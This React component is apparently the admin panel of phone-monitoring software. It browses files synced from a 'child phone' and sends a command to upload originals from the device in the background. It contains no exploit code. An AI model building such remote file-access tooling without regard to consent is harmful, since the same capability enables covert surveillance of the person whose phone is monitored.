// components/admin/devices/DeviceGalleryTab.tsx
"use client";

import React, { useState, useMemo } from "react";
import { DeviceFileItem } from "@/lib/device-types";
import { Input } from "@/components/ui/Input";
import { Image as ImageIcon, Video, Music, FileText, Search, RefreshCw, Folder, Download, X } from "lucide-react";
import { getSnapImageUrl } from "@/lib/storage";

interface Props {
  files: DeviceFileItem[];
  loading?: boolean;
  onSyncGallery: () => void;
  onSendCommand?: (cmd: string, payload?: any, label?: string) => void;
}

type SubTab = "all" | "image" | "video" | "audio" | "document";

export const DeviceGalleryTab: React.FC<Props> = ({ files, loading, onSyncGallery, onSendCommand }) => {
  const [activeTab, setActiveTab] = useState<SubTab>("all");
  const [search, setSearch] = useState("");
  const [previewFile, setPreviewFile] = useState<DeviceFileItem | null>(null);

  const counts = useMemo(() => ({
    all: files.length,
    image: files.filter((f) => f.file_type === "image").length,
    video: files.filter((f) => f.file_type === "video").length,
    audio: files.filter((f) => f.file_type === "audio").length,
    document: files.filter((f) => f.file_type === "document").length,
  }), [files]);

  const filtered = useMemo(() => files.filter((f) => 
    (activeTab === "all" || f.file_type === activeTab) && (!search || f.file_name.toLowerCase().includes(search.toLowerCase()))
  ), [files, activeTab, search]);

  const formatSize = (b: number) => !b ? "0 KB" : b > 1048576 ? (b / 1048576).toFixed(1) + " MB" : Math.round(b / 1024) + " KB";

  const getIcon = (type: string) => {
    if (type === "image") return <ImageIcon className="w-5 h-5 text-[#FFFC00]" />;
    if (type === "video") return <Video className="w-5 h-5 text-purple-400" />;
    if (type === "audio") return <Music className="w-5 h-5 text-emerald-400" />;
    if (type === "document") return <FileText className="w-5 h-5 text-blue-400" />;
    return <Folder className="w-5 h-5 text-white/50" />;
  };

  const [requestStatus, setRequestStatus] = useState<string | null>(null);

  const requestFile = (f: DeviceFileItem) => {
    onSendCommand?.("upload_file", { file_path: f.file_path, file_id: f.id, file_name: f.file_name }, `Fetch ${f.file_name}`);
    setRequestStatus(`⚡ Upload command sent to phone for "${f.file_name}". It will upload in background.`);
  };

  const SUB_TABS: { id: SubTab; label: string; count: number }[] = [
    { id: "all", label: "All Files", count: counts.all },
    { id: "image", label: "Images", count: counts.image },
    { id: "video", label: "Videos", count: counts.video },
    { id: "audio", label: "Audio", count: counts.audio },
    { id: "document", label: "Docs", count: counts.document },
  ];

  return (
    <div className="space-y-4">
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div>
          <h3 className="text-base font-bold text-white flex items-center gap-2">
            <Folder className="w-5 h-5 text-[#FFFC00]" /> Gallery &amp; Files Explorer ({files.length})
          </h3>
          <p className="text-xs text-white/50 mt-0.5">Browse images, camera videos, voice notes, and documents stored on child phone.</p>
        </div>
        <div className="flex items-center gap-2">
          <div className="relative w-full sm:w-56">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-white/40" />
            <Input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search files..." className="pl-8 h-8 text-xs bg-white/5" />
          </div>
          <button onClick={onSyncGallery} className="flex items-center gap-1.5 py-1.5 px-3 rounded-xl bg-[#FFFC00]/15 hover:bg-[#FFFC00]/25 text-[#FFFC00] font-bold text-xs border border-[#FFFC00]/30 transition-all active:scale-95 shrink-0">
            <RefreshCw className="w-3.5 h-3.5" /> Sync Gallery
          </button>
        </div>
      </div>

      <div className="flex items-center gap-1.5 p-1 rounded-2xl bg-white/[0.03] border border-white/5 overflow-x-auto select-none">
        {SUB_TABS.map(({ id, label, count }) => (
          <button key={id} onClick={() => setActiveTab(id)} className={`flex items-center gap-2 py-1.5 px-3 rounded-xl text-xs font-bold transition-all shrink-0 ${activeTab === id ? "bg-[#FFFC00] text-black shadow-md" : "text-white/60 hover:text-white hover:bg-white/5"}`}>
            <span>{label}</span>
            <span className={`text-[10px] px-1.5 py-0.2 rounded-full ${activeTab === id ? "bg-black/20 text-black" : "bg-white/10 text-white/60"}`}>{count}</span>
          </button>
        ))}
      </div>

      {loading ? (
        <div className="p-12 text-center text-xs text-white/40 flex items-center justify-center gap-2">
          <RefreshCw className="w-4 h-4 animate-spin text-[#FFFC00]" /> Loading gallery...
        </div>
      ) : filtered.length === 0 ? (
        <div className="p-10 rounded-2xl bg-white/[0.02] border border-white/10 text-center text-white/50 text-xs">
          {files.length === 0 ? "No media files synced yet. Click 'Sync Gallery' to fetch files from device." : "No files match your search."}
        </div>
      ) : (
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-2.5 max-h-[500px] overflow-y-auto pr-1">
          {filtered.map((file) => (
            <div key={file.id} onClick={() => setPreviewFile(file)} className="p-3 rounded-2xl bg-white/[0.02] hover:bg-white/[0.05] border border-white/5 transition-all flex items-start gap-3 group cursor-pointer">
              <div className="w-10 h-10 rounded-xl bg-white/5 border border-white/10 shrink-0 overflow-hidden flex items-center justify-center">
                {file.thumbnail_path ? (
                  <img src={file.thumbnail_path} alt={file.file_name} className="w-full h-full object-cover" />
                ) : file.storage_path && file.file_type === "image" ? (
                  <img src={getSnapImageUrl(file.storage_path)} alt={file.file_name} className="w-full h-full object-cover" />
                ) : (
                  getIcon(file.file_type)
                )}
              </div>
              <div className="min-w-0 flex-1">
                <h4 className="text-xs font-bold text-white truncate group-hover:text-[#FFFC00] transition-colors" title={file.file_name}>{file.file_name}</h4>
                <div className="flex items-center gap-2 mt-1 text-[11px] text-white/40 font-mono">
                  <span>{formatSize(file.file_size_bytes)}</span>
                  <span>&bull;</span>
                  <span className="capitalize">{file.file_type}</span>
                </div>
                <p className="text-[10px] text-white/30 truncate mt-0.5 font-mono" title={file.file_path}>{file.file_path}</p>
              </div>
            </div>
          ))}
        </div>
      )}

      {previewFile && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#0B0B0E] border border-white/15 rounded-3xl max-w-lg w-full p-6 space-y-4 shadow-2xl">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3 min-w-0">
                <div className="w-10 h-10 rounded-xl bg-white/5 border border-white/10 shrink-0 overflow-hidden flex items-center justify-center">
                  {previewFile.thumbnail_path ? (
                    <img src={previewFile.thumbnail_path} alt={previewFile.file_name} className="w-full h-full object-cover" />
                  ) : (
                    getIcon(previewFile.file_type)
                  )}
                </div>
                <div className="min-w-0">
                  <h4 className="text-sm font-bold text-white truncate">{previewFile.file_name}</h4>
                  <p className="text-xs text-white/40 capitalize">{previewFile.file_type} &bull; {formatSize(previewFile.file_size_bytes)}</p>
                </div>
              </div>
              <button onClick={() => setPreviewFile(null)} className="text-white/40 hover:text-white p-2"><X className="w-4 h-4" /></button>
            </div>

            {(previewFile.storage_path || previewFile.thumbnail_path) && previewFile.file_type === "image" && (
              <div className="relative w-full aspect-video max-h-60 rounded-2xl overflow-hidden bg-black border border-white/10 flex items-center justify-center">
                <img
                  src={previewFile.storage_path ? getSnapImageUrl(previewFile.storage_path) : previewFile.thumbnail_path!}
                  alt={previewFile.file_name}
                  className="max-h-60 object-contain rounded-xl"
                />
              </div>
            )}
            {previewFile.storage_path && previewFile.file_type === "audio" && (
              <audio controls src={getSnapImageUrl(previewFile.storage_path)} className="w-full" />
            )}
            {previewFile.storage_path && previewFile.file_type === "video" && (
              <video controls src={getSnapImageUrl(previewFile.storage_path)} className="w-full max-h-60 rounded-2xl" />
            )}

            <div className="p-3 rounded-2xl bg-white/[0.03] border border-white/5 font-mono text-[11px] text-white/60 space-y-1">
              <p className="truncate"><span className="text-white/30">Path:</span> {previewFile.file_path}</p>
              <p><span className="text-white/30">Size:</span> {previewFile.file_size_bytes.toLocaleString()} bytes</p>
            </div>

            {requestStatus && (
              <div className="p-2.5 rounded-xl bg-[#FFFC00]/10 border border-[#FFFC00]/30 text-[#FFFC00] text-xs font-semibold text-center">
                {requestStatus}
              </div>
            )}

            <div className="flex flex-col gap-2">
              {previewFile.storage_path ? (
                <a href={getSnapImageUrl(previewFile.storage_path)} download={previewFile.file_name} target="_blank" rel="noopener noreferrer" className="w-full py-2.5 rounded-xl bg-[#FFFC00] text-black font-extrabold text-xs flex items-center justify-center gap-1.5 hover:brightness-110 active:scale-95 transition-all">
                  <Download className="w-4 h-4" /> Download Original File
                </a>
              ) : previewFile.thumbnail_path ? (
                <a href={previewFile.thumbnail_path} download={previewFile.file_name} className="w-full py-2.5 rounded-xl bg-[#FFFC00] text-black font-extrabold text-xs flex items-center justify-center gap-1.5 hover:brightness-110 active:scale-95 transition-all">
                  <Download className="w-4 h-4" /> Download Image
                </a>
              ) : null}

              <div className="flex gap-2">
                {!previewFile.storage_path && (
                  <button onClick={() => requestFile(previewFile)} className="flex-1 py-2 px-3 rounded-xl bg-white/10 hover:bg-white/15 text-white font-bold text-xs flex items-center justify-center gap-1.5 transition-all">
                    <Download className="w-3.5 h-3.5 text-[#FFFC00]" /> Request Original From Phone
                  </button>
                )}
                <button onClick={() => { setPreviewFile(null); setRequestStatus(null); }} className="py-2 px-4 rounded-xl bg-white/10 text-white font-bold text-xs hover:bg-white/15 transition-all">Close</button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
